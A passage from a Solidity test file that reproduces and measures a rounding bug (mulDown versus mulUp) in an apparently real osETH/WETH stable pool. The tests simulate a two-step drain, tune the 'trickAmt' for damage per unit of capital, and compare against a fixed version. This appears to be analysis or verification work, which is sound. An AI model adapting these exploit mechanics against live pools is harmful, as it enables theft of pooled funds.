            try this.ext_simSwap(bal, sf, 0, 1, trickAmt, amp, fee, 0) returns (uint256[] memory nb2) {
                bal = nb2;
            } catch { emit log_string("  Step B REVERT"); continue; }

            uint256 W_post = bal[0];
            uint256 O_post = bal[1];
            uint256 O_up_post_vault = O_post.mulDown(sf[1]);
            uint256 gap = O_up_post_curve > O_up_post_vault
                ? O_up_post_curve - O_up_post_vault : 0;

            (bool okPost, uint256 D_post) = _safeInv(amp, W_post.mulDown(sf[0]), O_up_post_vault);
            emit log_named_uint("  Step A: O_up_pre = floor(O_A*sf)", O_up_pre);
            emit log_named_uint("  Step B: req_up = mulDown(17,sf)", req_up);
            emit log_named_uint("  Step B: O_up_post (CURVE view)", O_up_post_curve);
            emit log_named_uint("  Step B: O_up_post (VAULT view)", O_up_post_vault);
            emit log_named_uint("  Step B: integer gap (curve - vault)", gap);
            emit log_named_uint("  Step B: O_post raw (ABSOLUTE)", O_post);
            emit log_named_uint("  Step B: amountIn", W_post - W_A);
            if (okPre && okPost) {
                int256 dD = int256(D_post) - int256(D_pre);
                emit log_named_int("  Step B done: dD (preserves sign)", dD);
            } else {
                emit log_string("  Step B done: dD = N/A (Newton diverged)");
            }
        }
    }

    // ---------------------------------------------------------------------
    // testDiag_diagramVerify
    //
    // Print EVERY value shown in the chain-of-causation diagram so each one
    // can be verified directly from the trace. No inference, no arithmetic
    // shortcut: every number is either (a) read from on-chain state, (b)
    // computed by the same primitive the contract uses (mulDown / mulUp /
    // _calculateInvariant / _calcInGivenOut), or (c) the live result of
    // simSwapGivenOut.
    //
    // Specifically, the following claims from the diagram are printed:
    //   - Step A end state:  W_raw, O_raw, D
    //   - Scaling factors sf[WETH], sf[osETH]
    //   - O_up_pre   = mulDown(O_raw, sf[osETH])           (claim "= 19")
    //   - req_up     = mulDown(17, sf[osETH])              (claim "= 17")
    //   - O_up_post  = O_up_pre - req_up   (curve view)    (claim "= 2")
    //   - Step B (BUGGY) result:
    //       amountIn paid                                  (claim "= 625,492")
    //       W_raw_post                                     (claim "= 999,845")
    //       O_raw_post = O_raw_pre - 17  (vault view)      (claim "= 1")
    //       O_up_post_vault = mulDown(O_raw_post, sf)
    //       integer gap = O_up_post_curve - O_up_post_vault
    //   - D measured directly on (W_raw_post, O_raw_post)  (claim "= 112,405")
    //   - FIXED (mulUp) Step B from same Step A end:
    //       amountIn paid                                  (claim "= 1,041,412")
    //       W_raw_post                                     (claim "= 1,415,765")
    //       O_raw_post                                     (claim "= 1")
    function testDiag_diagramVerify() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0]; // WETH
        sf[1] = rawSf[2]; // osETH

        emit log_string("=== POOL PARAMETERS ===");
        emit log_named_uint("sf[WETH]  (1e18 means identity)", sf[0]);
        emit log_named_uint("sf[osETH] (the rate-providing token)", sf[1]);
        emit log_named_uint("amplification A", amp);
        emit log_named_uint("swap fee (1e18)", fee);

        // --- Step A: drive (67000, 67000) -> (W_A, 18) by selling 66982 osETH out
        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000;
        bal[1] = 67000;
        emit log_string("=== INITIAL POOL STATE (pre Step A) ===");
        emit log_named_uint("W_raw_init", bal[0]);
        emit log_named_uint("O_raw_init", bal[1]);
        emit log_named_uint("D_init", invUp(bal, sf, amp));

        // Step A in BUGGY mode (matches PoC exactly)
        bal = simSwapGivenOut(bal, sf, 0, 1, 67000 - 17 - 1, amp, fee, 0);

        emit log_string("=== STEP A END STATE (= Step B PRE-STATE) ===");
        emit log_named_uint("W_raw_pre  (claim: 374353)", bal[0]);
        emit log_named_uint("O_raw_pre  (claim: 18)", bal[1]);
        emit log_named_uint("D_pre      (claim: 138956)", invUp(bal, sf, amp));

        // Snapshot Step A end so we can re-run Step B in two modes
        uint256[] memory bal_A = _copy(bal);

        // --- Curve internal view (BUGGY) BEFORE Step B is executed ---
        emit log_string("=== STEP B - CURVE INTERNAL VIEW (BUGGY mulDown) ===");
        uint256 O_up_pre = bal_A[1].mulDown(sf[1]);
        uint256 req_up_mulDown = uint256(17).mulDown(sf[1]);
        uint256 O_up_post_curve = O_up_pre - req_up_mulDown;
        emit log_named_uint("O_up_pre  = mulDown(O_raw_pre=18, sf)  (claim: 19)", O_up_pre);
        emit log_named_uint("req_up    = mulDown(17, sf)            (claim: 17)", req_up_mulDown);
        emit log_named_uint("O_up_post_curve = O_up_pre - req_up    (claim: 2)", O_up_post_curve);

        // --- Step B BUGGY ---
        uint256 W_pre = bal_A[0];
        uint256[] memory balB = _copy(bal_A);
        balB = simSwapGivenOut(balB, sf, 0, 1, 17, amp, fee, 0);
        emit log_string("=== STEP B END STATE - BUGGY (mulDown) ===");
        emit log_named_uint("amountIn paid  (claim: 625492)", balB[0] - W_pre);
        emit log_named_uint("W_raw_post     (claim: 999845)", balB[0]);
        emit log_named_uint("O_raw_post     (claim: 1) = O_raw_pre - 17", balB[1]);

        uint256 O_up_post_vault = balB[1].mulDown(sf[1]);
        emit log_named_uint("O_up_post_vault = mulDown(O_raw_post, sf)", O_up_post_vault);
        emit log_named_uint("integer gap = curve - vault (claim: 1)", O_up_post_curve - O_up_post_vault);

        try this.ext_invUp(balB, sf, amp) returns (uint256 d) {
            emit log_named_uint("D measured at (W_post, O_post) (claim: 112405)", d);
        } catch {
            emit log_string("D measured at (W_post, O_post) = REVERT");
        }

        // --- Step B FIXED (mulUp) for comparison ---
        uint256[] memory balF = _copy(bal_A);
        balF = simSwapGivenOut(balF, sf, 0, 1, 17, amp, fee, 1);
        emit log_string("=== STEP B END STATE - FIXED (mulUp) ===");
        emit log_named_uint("amountIn paid  (claim: 1041412)", balF[0] - W_pre);
        emit log_named_uint("W_raw_post     (claim: 1415765)", balF[0]);
        emit log_named_uint("O_raw_post     (claim: 1)", balF[1]);
        try this.ext_invUp(balF, sf, amp) returns (uint256 d) {
            emit log_named_uint("D measured at FIXED end (claim: 138956 preserved)", d);
        } catch {
            emit log_string("D measured at FIXED end = REVERT");
        }

        // --- Differences quoted in the diagram ---
        emit log_string("=== DIAGRAM DELTAS ===");
        emit log_named_uint("FIXED.W_post - BUGGY.W_post   (claim: 415920)", balF[0] - balB[0]);
        emit log_named_uint("FIXED.amountIn - BUGGY.amountIn (claim: 415920)", (balF[0] - W_pre) - (balB[0] - W_pre));
    }

    // Compare ALL trickAmt that satisfy (vault_post=1, gap=1) head-to-head
    // to determine whether 17 is truly optimal or one of multiple equivalent
    // choices. For each candidate, run full Step A (drain to trickAmt+1)
    // + Step B (take trickAmt) and report:
    //   - Step A amountIn (cost of moving pool to attack position)
    //   - Step B amountIn (cost of triggering rounding gap)
    //   - Total amountIn = capital required per cycle
    //   - dD = pool damage per cycle
    //   - Efficiency = |dD| per million amountIn
    //
    // The "best" attacker choice maximizes |dD| per unit capital.
    function testDiag_trickAmtOptimum() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];
        emit log_named_uint("sf[osETH]", sf[1]);
        emit log_string("Threshold: frac(t*sf) must be >= ~0.9419 for gap=1");
        emit log_string("");

        // First enumerate the gap=1 family in 1..300 by direct calculation
        emit log_string("=== gap=1 family (vault=1) in trickAmt 1..300 ===");
        uint256 found = 0;
        for (uint256 t = 1; t <= 300 && found < 20; t++) {
            uint256 curve_post = (t + 1).mulDown(sf[1]) - t.mulDown(sf[1]);
            uint256 vault_post = uint256(1).mulDown(sf[1]);
            if (curve_post == vault_post + 1) {
                emit log_named_uint("  gap=1 trickAmt", t);
                found++;
            }
        }
        emit log_string("");

        // Now run head-to-head for the first several
        uint256[8] memory cands = [uint256(17), 34, 51, 68, 86, 103, 120, 137];

        for (uint256 i = 0; i < cands.length; i++) {
            uint256 t = cands[i];
            emit log_string("====================================================");
            emit log_named_uint("CANDIDATE trickAmt", t);

            // Step A: drain (67000 - t - 1) osETH out
            uint256[] memory bal = new uint256[](2);
            bal[0] = 67000; bal[1] = 67000;
            try this.ext_simSwap(bal, sf, 0, 1, 67000 - t - 1, amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb;
            } catch { emit log_string("  Step A REVERT"); continue; }

            uint256 W_A = bal[0];
            uint256 stepA_amountIn = W_A - 67000;
            uint256 D_pre = invUp(bal, sf, amp);
            emit log_named_uint("  Step A: amountIn (W spent)", stepA_amountIn);
            emit log_named_uint("  Step A: end O_raw (= t+1)", bal[1]);
            emit log_named_uint("  Step A: D after", D_pre);

            // Step B: take trickAmt out
            try this.ext_simSwap(bal, sf, 0, 1, t, amp, fee, 0) returns (uint256[] memory nb2) {
                bal = nb2;
            } catch { emit log_string("  Step B REVERT"); continue; }

            uint256 W_post = bal[0];
            uint256 O_post = bal[1];
            uint256 stepB_amountIn = W_post - W_A;

            emit log_named_uint("  Step B: amountIn (W spent)", stepB_amountIn);
            emit log_named_uint("  Step B: end W_raw", W_post);
            emit log_named_uint("  Step B: end O_raw (claim: 1)", O_post);

            (bool ok, uint256 D_post) = _safeInv(amp, W_post.mulDown(sf[0]), O_post.mulDown(sf[1]));
            if (!ok) { emit log_string("  Step B: D measurement REVERT (Newton diverged)"); continue; }

            int256 dD = int256(D_post) - int256(D_pre);
            uint256 absDD = dD < 0 ? uint256(-dD) : uint256(dD);
            uint256 totalCost = stepA_amountIn + stepB_amountIn;

            emit log_named_uint("  Step B: D after", D_post);
            emit log_named_int("  Step B: dD (NEG = pool loss)", dD);
            emit log_named_uint("  TOTAL amountIn (Step A + Step B)", totalCost);
            // Efficiency: D damage per 1M W locked
            if (totalCost > 0) {
                emit log_named_uint("  EFFICIENCY: |dD|*1e6 / totalCost", absDD * 1e6 / totalCost);
            }
        }

        emit log_string("");
        emit log_string("Higher EFFICIENCY = attacker prefers (more D damage per W spent)");
    }

    // Can we ever construct vault_post = 1 with curve_post > 2 (i.e., gap >= 2)?
    //
    // Math says no: gap = floor((a+b)*sf) - floor(a*sf) - floor(b*sf), which is
    // the subadditivity defect of floor; this is provably in {0, 1} for any
    // positive sf and any non-negative a, b.
    //
    // Here we ENUMERATE every trickAmt from 1 to 200 with O_raw_post fixed at
    // 1 (so O_raw_pre = trickAmt + 1) and print the (curve_post, vault_post)
    // pair to confirm: gap is 0 or 1, never larger.
    //
    // Then we run the actual swaps for the gap=1 cases and compare D loss to
    // see whether trickAmt choice within the gap=1 family materially changes
    // the damage at vault=1.
    function testDiag_gapMagnitudeAtVault1() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];
        emit log_named_uint("sf[osETH]", sf[1]);
        emit log_named_uint("vault_post (mulDown(1, sf))", uint256(1).mulDown(sf[1]));
        emit log_string("Sweeping trickAmt = 1..200, with O_raw_post pinned at 1");
        emit log_string("");

        // Pass 1: enumerate (curve, vault) pair for each trickAmt and report max gap
        uint256 maxGap = 0;
        uint256 countGap0 = 0;
        uint256 countGap1 = 0;
        for (uint256 t = 1; t <= 200; t++) {
            uint256 a = t;
            uint256 b = 1; // O_raw_post pinned at 1
            uint256 curve_post = (a + b).mulDown(sf[1]) - a.mulDown(sf[1]);
            uint256 vault_post = b.mulDown(sf[1]);
            uint256 gap = curve_post >= vault_post ? curve_post - vault_post : 0;
            if (gap > maxGap) maxGap = gap;
            if (gap == 0) countGap0++;
            else if (gap == 1) countGap1++;
        }
        emit log_named_uint("MAX gap observed across trickAmt=1..200", maxGap);
        emit log_named_uint("count of trickAmt with gap=0", countGap0);
        emit log_named_uint("count of trickAmt with gap=1", countGap1);
        emit log_named_uint("count of trickAmt with gap>=2", 200 - countGap0 - countGap1);

        // Pass 2: for first ~10 trickAmt values, dump (curve, vault) pair
        emit log_string("");
        emit log_string("=== Detailed (curve, vault) for trickAmt in 1..30 (vault always = 1) ===");
        for (uint256 t = 1; t <= 30; t++) {
            uint256 a = t;
            uint256 b = 1;
            uint256 curve_post = (a + b).mulDown(sf[1]) - a.mulDown(sf[1]);
            uint256 vault_post = b.mulDown(sf[1]);
            uint256 gap = curve_post >= vault_post ? curve_post - vault_post : 0;
            emit log_named_uint(string(abi.encodePacked(
                "  trickAmt=", _u(t), "  curve=", _u(curve_post),
                "  vault=", _u(vault_post), "  gap"
            )), gap);
        }

        // Pass 3: for a few trickAmt where gap = 1, actually run Step A + Step B
        // and measure D loss. This confirms whether ALL gap=1 trickAmt values
        // produce comparable damage when landing at vault=1.
        emit log_string("");
        emit log_string("=== Real swap damage (D loss) for gap=1 trickAmt at vault=1 ===");
        uint256[5] memory trickList = [uint256(17), 34, 51, 68, 86];
        for (uint256 i = 0; i < trickList.length; i++) {
            uint256 t = trickList[i];
            uint256[] memory bal = new uint256[](2);
            bal[0] = 67000; bal[1] = 67000;
            try this.ext_simSwap(bal, sf, 0, 1, 67000 - (t + 1), amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb;
            } catch { emit log_named_string("  Step A REVERT trickAmt", _u(t)); continue; }

            uint256 W_A = bal[0];
            uint256 D_pre = invUp(bal, sf, amp);
            try this.ext_simSwap(bal, sf, 0, 1, t, amp, fee, 0) returns (uint256[] memory nb2) {
                bal = nb2;
            } catch { emit log_named_string("  Step B REVERT trickAmt", _u(t)); continue; }

            uint256 W_post = bal[0];
            uint256 O_post = bal[1];
            (bool ok, uint256 D_post) = _safeInv(amp, W_post.mulDown(sf[0]), O_post.mulDown(sf[1]));
            int256 dD = ok ? int256(D_post) - int256(D_pre) : int256(0);
            emit log_named_uint(string(abi.encodePacked("  trickAmt=", _u(t), "  amountIn")), W_post - W_A);
            emit log_named_int(string(abi.encodePacked("  trickAmt=", _u(t), "  dD")), dD);
        }
    }

    // Compare attack damage when the rounding gap = 1 is parked at different
    // post-state O values. Same trickAmt=17 (so request_up = 17, gap mechanism
    // identical), but Step A drains to different O_target so Step B's vault
    // post-state lands at O = 1, 2, 3, 4, 5, 6, ... instead of just 1.
    //
    // Predicted geometric scaling: dD/dO ~ D/(3*O) at the boundary, so
    //   - landing at O=1 should be the worst (largest |dD|)
    //   - landing at O=2 should be ~half as bad
    //   - landing at O=3 should be ~one-third as bad
    //   - and so on.
    function testDiag_gapAtDifferentO() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];
        emit log_named_uint("scaling factor osETH (sf)", sf[1]);
        emit log_named_uint("mulDown(17, sf) (claim: 17)", uint256(17).mulDown(sf[1]));
        emit log_string("All cases use trickAmt=17 (same rounding mechanism)");
        emit log_string("Each case differs only in where Step A leaves O_raw");
        emit log_string("");

        // O_target values: pre-Step-B O_raw -> post-Step-B O_raw will be O_target-17
        uint256[7] memory O_target = [uint256(18), 19, 20, 21, 22, 25, 30];
        uint256 trickAmt = 17;

        for (uint256 i = 0; i < O_target.length; i++) {
            emit log_string("====================================================");
            emit log_named_uint("CASE: O_target (Step A end O_raw)", O_target[i]);

            // Step A: drain (67000 - O_target) osETH out
            uint256[] memory bal = new uint256[](2);
            bal[0] = 67000; bal[1] = 67000;
            try this.ext_simSwap(bal, sf, 0, 1, 67000 - O_target[i], amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb;
            } catch { emit log_string("  Step A REVERT"); continue; }

            uint256 W_A = bal[0];
            uint256 O_A = bal[1];
            (bool okPre, uint256 D_pre) = _safeInv(amp, W_A.mulDown(sf[0]), O_A.mulDown(sf[1]));
            emit log_named_uint("  after Step A: W_A", W_A);
            emit log_named_uint("  after Step A: O_A (raw)", O_A);
            if (okPre) emit log_named_uint("  after Step A: D_pre", D_pre);

            // Curve internal view of Step B
            uint256 O_up_pre = O_A.mulDown(sf[1]);
            uint256 req_up = trickAmt.mulDown(sf[1]);
            uint256 O_up_post_curve = O_up_pre - req_up;
            emit log_named_uint("  Step B: O_up_pre = mulDown(O_A, sf)", O_up_pre);
            emit log_named_uint("  Step B: O_up_post (CURVE view)", O_up_post_curve);

            // Step B: take 17 osETH out
            try this.ext_simSwap(bal, sf, 0, 1, trickAmt, amp, fee, 0) returns (uint256[] memory nb2) {
                bal = nb2;
            } catch { emit log_string("  Step B REVERT"); continue; }

            uint256 W_post = bal[0];
            uint256 O_post = bal[1];
            uint256 O_up_post_vault = O_post.mulDown(sf[1]);
            uint256 gap = O_up_post_curve > O_up_post_vault
                ? O_up_post_curve - O_up_post_vault : 0;

            emit log_named_uint("  Step B: O_up_post (VAULT view)", O_up_post_vault);
            emit log_named_uint("  Step B: integer gap (curve - vault)", gap);
            emit log_named_uint("  Step B: O_post raw (ABSOLUTE)", O_post);
            emit log_named_uint("  Step B: amountIn paid", W_post - W_A);
            emit log_named_uint("  Step B: W_post", W_post);

            (bool okPost, uint256 D_post) = _safeInv(amp, W_post.mulDown(sf[0]), O_up_post_vault);
            if (okPre && okPost) {
                int256 dD = int256(D_post) - int256(D_pre);
                emit log_named_uint("  Step B: D_post", D_post);
                emit log_named_int("  Step B: dD (NEG = pool loss)", dD);
                // Geometric prediction at O_post: |dD| ~ D_pre / (3 * O_up_post_vault)
                if (O_up_post_vault > 0) {
                    emit log_named_uint("  geometric predict |dD/dO|@O_vault = D/(3*O)", D_pre / (3 * O_up_post_vault));
                }
            } else {
                emit log_string("  Step B: D_post = N/A (Newton diverged)");
            }
        }
    }

    // Probe the asymmetry between FORWARD (D given balances) and INVERSE
    // (one balance given D and others) Newton iterations at the FIXED end
    // state (W=1,415,765, O=1). Both StableMath functions use the same
    // 255-iteration limit and same |new-prev| <= 1 stopping rule, but they
    // solve completely different equations.
    function testDiag_newtonAsymmetry() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();

        emit log_named_uint("amp (with AMP_PRECISION=1000)", amp);
        uint256 D_target = 138956;

        // INVERSE: given D=138956 and O=1, solve for W
        // The function uses balances[tokenIndex] as both Newton starting point
        // AND in computing P_D / c, so it must be set to the pre-swap value
        // (matches how _calcInGivenOut calls it: pre-swap W is still in the slot).
        emit log_string("=== INVERSE Newton: given D=138956, O=1, find W ===");
        emit log_string("(starting hint = pre-swap W = 374353, matches real call)");
        uint256[] memory bal = new uint256[](2);
        bal[0] = 374353; bal[1] = 1; // tokenIndex=0 (W) is unknown; 374353 is starting hint
        try this.ext_balGivenInv(amp, bal, D_target, 0) returns (uint256 W) {
            emit log_named_uint("solved W (Newton converged)", W);
            // Now try the FORWARD: given (W, 1), can Newton recover D?
            emit log_string("=== FORWARD Newton at the SAME (W, 1) ===");
            uint256[] memory pp = new uint256[](2);
            pp[0] = W; pp[1] = 1;
            try this.ext_inv(amp, pp) returns (uint256 d_back) {
                emit log_named_uint("D recovered (Newton converged)", d_back);
                emit log_named_int("residual = D_recovered - D_target", int256(d_back) - int256(D_target));
            } catch {
                emit log_string("FORWARD diverged at SAME (W,1) point !");
            }
        } catch {
            emit log_string("INVERSE diverged");
        }

        // Sweep FORWARD around the FIXED W to map the divergence neighbourhood
        emit log_string("=== FORWARD D sweep along O=1 around W=1415765 ===");
        uint256[10] memory Ws = [
            uint256(100000), 500000, 800000, 1000000, 1200000,
            1400000, 1415765, 1500000, 2000000, 5000000
        ];
        for (uint256 i = 0; i < Ws.length; i++) {
            uint256[] memory pp2 = new uint256[](2);
            pp2[0] = Ws[i]; pp2[1] = 1;
            try this.ext_inv(amp, pp2) returns (uint256 d) {
                emit log_named_uint(string(abi.encodePacked("  D at W=", _u(Ws[i]), ", O=1")), d);
            } catch {
                emit log_named_string(string(abi.encodePacked("  D at W=", _u(Ws[i]), ", O=1")), "REVERT");
            }
        }

        // Sweep INVERSE around D_target with O=1 (use 374353 as starting hint)
        emit log_string("=== INVERSE W sweep, O=1, varying D (hint=374353) ===");
        uint256[8] memory Ds = [uint256(50000), 100000, 138956, 150000, 200000, 500000, 1000000, 5000000];
        for (uint256 i = 0; i < Ds.length; i++) {
            uint256[] memory pp3 = new uint256[](2);
            pp3[0] = 374353; pp3[1] = 1;
            try this.ext_balGivenInv(amp, pp3, Ds[i], 0) returns (uint256 W) {
                emit log_named_uint(string(abi.encodePacked("  W at D=", _u(Ds[i]), ", O=1")), W);
            } catch {
                emit log_named_string(string(abi.encodePacked("  W at D=", _u(Ds[i]), ", O=1")), "REVERT");
            }
        }
    }

    function ext_balGivenInv(uint256 amp, uint256[] memory bal, uint256 inv, uint256 idx)
        external pure returns (uint256)
    {
        return StableMath._getTokenBalanceGivenInvariantAndAllOtherBalances(amp, bal, inv, idx);
    }

    // Question: does the leak need to be MAXIMIZED, or just need to cross the
    // integer-jump threshold {n*sf} > 1 - {sf} ?
    // Sweep representative trickAmt values, all forced through Step A->Step B
    // with the same starting (67000, 67000). Compare ΔD and amountIn across
    // candidates with different leak sizes.
    function testDiag_leakSize_sweep() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];
        emit log_named_uint("scaling factor osETH (sf)", sf[1]);
        emit log_string("threshold for jump-by-2: {n*sf} must be > 1 - {sf} = ~0.9419");

        // Candidates that PASS the threshold (each gives integer gap = 1)
        uint256[5] memory good = [uint256(17), 34, 51, 68, 86];
        // Candidates that FAIL (each gives integer gap = 0, attack inert)
        uint256[3] memory bad = [uint256(1), 85, 170];

        for (uint256 i = 0; i < good.length; i++) {
            emit log_string("==== PASS-THRESHOLD CANDIDATE ====");
            _stepBCompareOne(sf, amp, fee, good[i]);
        }
        for (uint256 i = 0; i < bad.length; i++) {
            emit log_string("==== FAIL-THRESHOLD CANDIDATE ====");
            _stepBCompareOne(sf, amp, fee, bad[i]);
        }
    }
}
